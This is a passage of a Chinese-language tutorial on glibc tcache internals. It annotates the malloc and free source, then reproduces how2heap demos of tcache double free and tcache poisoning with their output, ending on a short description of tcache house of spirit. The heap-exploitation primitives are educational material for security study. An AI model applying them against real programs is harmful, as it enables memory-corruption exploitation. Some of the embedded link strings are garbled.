
```c
   int iters = 0;

      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))

        {

          ....................

          ....................

          ....................

          /* remove from unsorted list */

          unsorted_chunks (av)->bk = bck;

          bck->fd = unsorted_chunks (av);

          // 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache 

#if USE_TCACHE

         // 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历

         We may return one of these chunks later.  */

          if (tcache_nb

          && tcache->counts[tc_idx] < mp_.tcache_count)

        {

          tcache_put (victim, tc_idx);

          return_cached = 1;

          continue;

        }

          else

        {

#endif

              check_malloced_chunk (av, victim, nb);

              void *p = chunk2mem (victim);

              alloc_perturb (p, bytes);

              return p;

#if USE_TCACHE

        }

#endif

            }



         //大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。

         .......................................

         .......................................

         .......................................

#if USE_TCACHE

      //如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit > 0 默认为 0 ，不会进入分支, 继续遍历 

      ++tcache_unsorted_count;

      if (return_cached

      && mp_.tcache_unsorted_limit > 0

      && tcache_unsorted_count > mp_.tcache_unsorted_limit)

    {

      return tcache_get (tc_idx);

    }

#endif



         .......................................

         .......................................

         .......................................

         } // end of  while ((victim = unsorted_chunks (av)->b



//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk

#if USE_TCACHE

      /* If all the small chunks we found ended up cached, return one now.  */

      if (return_cached)

    {

      return tcache_get (tc_idx);

    }

#endif
```

在遍历unsorted bin的时候,如果有大小适配的chunk,不会立刻返回,而是将这个chunk加入Tcache,并且设置`return_cached=1`,表示Tcache此时已经有了符合大小的chunk.如果大小不是正好适配,那么就把chunk放到相应的bin中.

遍历完unsorted bin之后,根据`return_cached`的值来判断Tcache里面是否有符合大小的chunk,如果有的话直接调用`tcache_get(tc_idx)`并返回获得的chunk.如果没有的话则继续使用large bin或者top chunk来分配.

## 内存释放

```c
static void

_int_free (mstate av, mchunkptr p, int have_lock)

{

  ......

  size = chunksize (p);

  check_inuse_chunk(av, p);



#if USE_TCACHE

  {

    size_t tc_idx = csize2tidx (size);



    if (tcache

    && tc_idx < mp_.tcache_bins

    && tcache->counts[tc_idx] < mp_.tcache_count)

      {

    tcache_put (p, tc_idx);

    return;

      }

  }

#endif
```

首先获取要释放的chunk的`size`,然后判断`size`是否符合规范,如果符合的话就看`tcache->counts[tc_idx]`有没有满,没满的话就直接放入Tcache,然后返回,

如果上述条件没有成立的话,就按照常规方法来释放chunk.

## 小结

Tcache有64个bin数组,所以在64位的情况下,Tcache可以接受0×20~0×410大小的chunk.当我们分配这个范围内的chunk时,不会直接进入bin,而是在Tcache中分配内存,释放的时候也是同理,但是Tcache自身基本没什么检测,所以我们可以轻易实现好多在bin中很难进行的操作.

## Tcache Attack

实验环境: Glibc 2.27

示例文件: how2heap(51dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3g2D9L8s2m8Z5K9i4y4Z5i4K6u0r3K9r3!0%4x3X3S2W2j5i4m8Q4x3U0V1`.

### Tcache_dup

Tcache在`free`的时候并不会修改`in_use`位,所以我们可以连续释放同一个chunk来造成Double free,这个比fast bin还不安全.

```c
#include <stdio.h>

#include <stdlib.h>



int main()

{

        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");



        fprintf(stderr, "Allocating buffer.\n");

        int *a = malloc(8);



        fprintf(stderr, "malloc(8): %p\n", a);

        fprintf(stderr, "Freeing twice...\n");

        free(a);

        free(a);



        fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);

        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));



        return 0;

}
```

运行结果为:

```c
This file demonstrates a simple double-free attack with tcache.

Allocating buffer.

malloc(8): 0x7fffd4adb260

Freeing twice...

Now the free list has [ 0x7fffd4adb260, 0x7fffd4adb260 ].

Next allocated buffers will be same: [ 0x7fffd4adb260, 0x7fffd4adb260 ].
```

### Tcache poisoning

这个其实挺恐怖的,只要修改空闲Tcache的`next`指针,直接就能分配任意地址了.

```c
#include <stdio.h>

#include <stdlib.h>

#include <stdint.h>



int main()

{

    // disable buffering

    setbuf(stdin, NULL);

    setbuf(stdout, NULL);



    printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"

           "returning a pointer to an arbitrary location (in this case, the stack).\n"

           "The attack is very similar to fastbin corruption attack.\n");

    printf("After the patch b6bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2%4j5i4u0W2i4K6u0W2L8%4u0Y4i4K6u0r3k6$3W2@1i4K6u0r3i4K6y4r3M7q4)9K6c8r3N6D9K9h3u0U0i4K6u0W2k6$3W2@1i4K6y4n7j5g2)9K6c8r3y4G2L8h3#2A6N6q4)9K6b7X3S2Q4x3@1b7%4y4$3c8U0x3r3b7^5y4U0b7K6j5h3p5&6z5h3x3&6x3X3u0X3y4U0M7I4x3K6f1J5j5U0m8S2z5r3q4V1k6r3f1%4x3o6f1^5z5e0k6X3i4K6u0o6i4K6g2o6L8R3`.`."

           "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");



    size_t stack_var;

    printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);



    printf("Allocating 2 buffers.\n");

    intptr_t *a = malloc(128);

    printf("malloc(128): %p\n", a);

    intptr_t *b = malloc(128);

    printf("malloc(128): %p\n", b);



    printf("Freeing the buffers...\n");

    free(a);

    free(b);



    printf("Now the tcache list has [ %p -> %p ].\n", b, a);

    printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"

           "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);

    b[0] = (intptr_t)&stack_var;

    printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);



    printf("1st malloc(128): %p\n", malloc(128));

    printf("Now the tcache list has [ %p ].\n", &stack_var);



    intptr_t *c = malloc(128);

    printf("2nd malloc(128): %p\n", c);

    printf("We got the control\n");



    return 0;

}
```

运行结果为:

```c
This file demonstrates a simple tcache poisoning attack by tricking malloc into

returning a pointer to an arbitrary location (in this case, the stack).

The attack is very similar to fastbin corruption attack.

After the patch 71dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2%4j5i4u0W2i4K6u0W2L8%4u0Y4i4K6u0r3k6$3W2@1i4K6u0r3i4K6y4r3M7q4)9K6c8r3N6D9K9h3u0U0i4K6u0W2k6$3W2@1i4K6y4n7j5g2)9K6c8r3y4G2L8h3#2A6N6q4)9K6b7X3S2Q4x3@1b7%4y4$3c8U0x3r3b7^5y4U0b7K6j5h3p5&6z5h3x3&6x3X3u0X3y4U0M7I4x3K6f1J5j5U0m8S2z5r3q4V1k6r3f1%4x3o6f1^5z5e0k6X3i4K6u0o6

We have to create and free one more chunk for padding before fd pointer hijacking.



The address we want malloc() to return is 0x7fffff905088.

Allocating 2 buffers.

malloc(128): 0x7ffff76b0260

malloc(128): 0x7ffff76b02f0

Freeing the buffers...

Now the tcache list has [ 0x7ffff76b02f0 -> 0x7ffff76b0260 ].

We overwrite the first 8 bytes (fd/next pointer) of the data at 0x7ffff76b02f0

to point to the location to control (0x7fffff905088).

Now the tcache list has [ 0x7ffff76b02f0 -> 0x7fffff905088 ].

1st malloc(128): 0x7ffff76b02f0

Now the tcache list has [ 0x7fffff905088 ].

2nd malloc(128): 0x7fffff905088

We got the control
```

可以回顾一下`tcache_get`函数,拿chunk出来的时候并不检查地址是否合法,`malloc`分配的时候,也只是简单的判断了一下`tcache->entries[tc_idx]`是否为空.所以就造成了任意地址分配.

### tcache_house_of_spirit

比以前的house of spirit更简单了,只需伪造一个`size`区域，然后将伪造的fake chunk释放，再次`malloc`相应大小就可以得到`fake_chunk`.
